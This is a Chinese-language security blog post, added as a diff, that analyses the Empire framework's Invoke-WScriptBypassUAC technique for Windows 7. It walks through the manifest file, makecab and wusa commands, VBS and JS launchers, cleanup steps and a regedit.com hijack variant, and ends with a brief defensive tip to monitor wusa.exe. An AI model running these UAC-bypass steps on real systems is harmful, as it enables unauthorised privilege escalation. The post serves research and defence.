@@ -1,0 +1,238 @@
+I"�&<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>知名的后渗透测试框架Empire是一个很好的学习模板，其中包含的后渗透技巧很值得深入研究。</p>
+
+<p>本文将要挑选Empire中一个经典的UAC绕过方法Invoke-WScriptBypassUAC进行分析，介绍绕过原理以及在渗透测试中的更多利用技巧。知道如何利用，才能知道如何防御。</p>
+
+<p>Invoke-WScriptBypassUAC地址：</p>
+
+<p>https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-WScriptBypassUAC.ps1</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍如下内容：</p>
+
+<ul>
+  <li>Invoke-WScriptBypassUAC绕过原理</li>
+  <li>利用扩展</li>
+  <li>防御检测</li>
+</ul>
+
+<h2 id="0x02-invoke-wscriptbypassuac绕过原理">0x02 Invoke-WScriptBypassUAC绕过原理</h2>
+<hr />
+
+<p>Invoke-WScriptBypassUAC通过powershell实现，思路上借鉴了Vozzie分享的github，地址如下：</p>
+
+<p>https://github.com/Vozzie/uacscript</p>
+
+<p>Vozzie提到ZDI和微软选择忽略该UAC绕过“漏洞”，ZDI认为这不是一个远程漏洞，微软认为UAC绕过不属于漏洞范畴</p>
+
+<p>Invoke-WScriptBypassUAC在实现上使用了一些实用的小技巧，所以本文主要对Invoke-WScriptBypassUAC的绕过方法进行分析</p>
+
+<p>该方法只适用于Win7，而Win8、Win10不适用（原因在后面介绍）</p>
+
+<p>测试系统： Win7 x86</p>
+
+<p>由于powershell格式的源代码公开，所以直接介绍该脚本关键的操作流程：</p>
+
+<ol>
+  <li>判断操作系统是否为Win7，是否为普通权限</li>
+  <li>Temp目录释放文件wscript.exe.manifest</li>
+  <li>使用makecab.exe对wscript.exe.manifest和wscript.exe进行压缩</li>
+  <li>使用wusa将压缩包解压缩，将wscript.exe.manifest和wscript.exe释放至c:\Windows目录</li>
+  <li>payload保存在Appdata文件夹的ADS中</li>
+  <li>使用c:\Windows\wscript.exe执行payload，实现管理员权限执行payload，绕过UAC</li>
+</ol>
+
+<h2 id="0x03-利用扩展">0x03 利用扩展</h2>
+<hr />
+
+<p>掌握操作流程后，我们完全可以手动进行拆分测试，在这个过程中能发现更多利用思路</p>
+
+<h3 id="1保存wscriptexemanifest文件">1、保存wscript.exe.manifest文件</h3>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
+&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1"
+          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
+          manifestVersion="1.0"&gt;
+  &lt;asmv3:trustInfo&gt;
+    &lt;security&gt;
+      &lt;requestedPrivileges&gt;
+        &lt;requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/&gt;
+      &lt;/requestedPrivileges&gt;
+    &lt;/security&gt;
+  &lt;/asmv3:trustInfo&gt;
+  &lt;asmv3:application&gt;
+    &lt;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;
+      &lt;autoElevate&gt;true&lt;/autoElevate&gt;
+      &lt;dpiAware&gt;true&lt;/dpiAware&gt;
+    &lt;/asmv3:windowsSettings&gt;
+  &lt;/asmv3:application&gt;
+&lt;/assembly&gt;
+</code></pre></div></div>
+
+<h3 id="2使用makecab制作cab文件">2、使用makecab制作cab文件</h3>
+
+<p>cmd:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecab c:\windows\system32\wscript.exe %TMP%\1.tmp
+makecab wscript.exe.manifest %TMP%\2.tmp
+</code></pre></div></div>
+
+<h3 id="3使用wusa解压缩cab文件并释放至cwindows">3、使用wusa解压缩cab文件并释放至c:\windows</h3>
+
+<p>cmd:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wusa %TMP%\1.tmp /extract:"c:\windows" /quiet
+wusa %TMP%\2.tmp /extract:"c:\windows" /quiet
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>该方法成功的关键在于使用wusa能够将cab文件解压缩至c:\windows，通常情况下，向c:\windows目录释放文件需要管理员权限，而借助wusa，普通用户权限即可，当然其他管理员权限的目录也可以，例如： <code class="language-plaintext highlighter-rouge">C:\Windows\addins</code></p>
+
+<h3 id="4使用该wscriptexe执行vbs或者js脚本">4、使用该wscript.exe执行vbs或者js脚本</h3>
+
+<p>cmd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\wscript.exe c:\test\1.vbs
+c:\windows\wscript.exe c:\test\1.js
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>此处js和vbs脚本需要绝对路径，虽然是普通用户权限的cmd，但因为wscript.exe同级目录下的wscript.exe.manifest指定以管理员权限启动，所以执行的vbs或者js脚本是管理员权限，这就实现了UAC绕过</p>
+
+<p>执行cmd命令对应的vbs脚本如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim objShell
+Dim oFso
+Set oFso = CreateObject("Scripting.FileSystemObject")
+Set objShell = WScript.CreateObject("WScript.Shell")
+command = "cmd /c calc.exe"
+objShell.Run command, 0
+Set objShell = Nothing
+</code></pre></div></div>
+
+<p>对应的js脚本如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe",0,true);
+</code></pre></div></div>
+
+<h3 id="5绕过后清除缓存文件">5、绕过后清除缓存文件</h3>
+
+<p>删除c:\windows\下的wscript.exe和wscript.exe.manifest</p>
+
+<p>对应vbs脚本如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim objShell
+Dim oFso
+Set oFso = CreateObject("Scripting.FileSystemObject")
+Set objShell = WScript.CreateObject("WScript.Shell")
+command = "cmd /c del c:\windows\wscript.exe &amp;&amp; del c:\windows\wscript.exe.manifest"
+objShell.Run command, 0
+Set objShell = Nothing
+</code></pre></div></div>
+
+<p>对应js脚本如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new ActiveXObject("WScript.Shell").Run("cmd /c del c:\\windows\\wscript.exe &amp;&amp; del c:\\windows\\wscript.exe.manifest",0,true);
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>删除c:\windows\下的wscript.exe和wscript.exe.manifest需要管理员权限</p>
+
+<p>删除缓存文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del %TMP%\1.tmp
+del %TMP%\2.tmp
+</code></pre></div></div>
+
+<h3 id="6补充">6、补充</h3>
+
+<p>(1)可供利用的路径有很多，查看文件夹属性可使用如下powershell命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path c:\windows|select Owner
+</code></pre></div></div>
+
+<p>(2)保存vbs或者js脚本的路径有很多，例如特殊ads：</p>
+
+<ul>
+  <li>…文件</li>
+  <li>特殊COM文件</li>
+  <li>磁盘根目录</li>
+</ul>
+
+<p>更多细节可参考文章<a href="https://3gstudent.github.io/Hidden-Alternative-Data-Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7">《Hidden Alternative Data Streams的进阶利用技巧》</a></p>
+
+<p>当然，Invoke-WScriptBypassUAC使用的ADS位置也很隐蔽</p>
+
+<p><code class="language-plaintext highlighter-rouge">$env:USERPROFILE\AppData</code>默认为系统隐藏文件</p>
+
+<p>所以使用<code class="language-plaintext highlighter-rouge">dir /r</code>看不到文件夹<code class="language-plaintext highlighter-rouge">$env:USERPROFILE\AppData</code>，当然也无法看到添加的ads</p>
+
+<p>需要使用<code class="language-plaintext highlighter-rouge">dir /a:h /r</code> （/a:h指定查看系统隐藏文件）才能看到，或者查看所有文件：<code class="language-plaintext highlighter-rouge">dir /a /r</code></p>
+
+<p>(3)Win8失败的原因</p>
+
+<p>使用makecab和wusa能够将cab文件解压缩至高权限目录，如c:\windows</p>
+
+<p>但利用wscript.exe和wscript.exe.manifest实现高权限执行的方法失效，Win8使用了内嵌manifest</p>
+
+<p>(4)Win10失败的原因</p>
+
+<p>Win10系统无法使用makecab和wusa能够将cab文件解压缩至高权限目录，如c:\windows</p>
+
+<p>当然，也使用了内嵌manifest</p>
+
+<h2 id="0x04-wusa特性的进一步利用">0x04 wusa特性的进一步利用</h2>
+<hr />
+
+<p><strong>wusa特性：</strong></p>
+
+<p>在普通用户的权限下，能够将文件释放至管理员权限的文件夹</p>
+
+<p>适用Win7、Win8</p>
+
+<h3 id="利用一文件名劫持">利用一：文件名劫持</h3>
+
+<p>1、将calc.exe重命名为regedit.com</p>
+
+<p>2、在c:\windows释放文件regedit.com</p>
+
+<p>cmd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecab c:\test\regedit.com %TMP%\1.tmp
+wusa %TMP%\1.tmp /extract:"c:\windows" /quiet
+</code></pre></div></div>
+
+<p>3、劫持</p>
+
+<p>cmd输入regedit，会执行regedit.com，而不是regedit.exe</p>
+
+<p>关于该利用方法的详情可参考文章：《A dirty way of tricking users to bypass UAC》</p>
+
+<h3 id="其他利用方法暂略">其他利用方法(暂略)</h3>
+
+<h2 id="0x05-防御">0x05 防御</h2>
+<hr />
+
+<p>该UAC绕过方法只适用于Win7，尚未见到对应补丁，杀毒软件能对此脚本进行拦截，但也存在绕过方法</p>
+
+<p>站在防御者的角度，建议监控wusa.exe的调用</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文对Invoke-WScriptBypassUAC进行了分析，虽然微软不认可该漏洞，但在后渗透阶段，不论是渗透测试人员，还是防御方，对此都应该注意。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
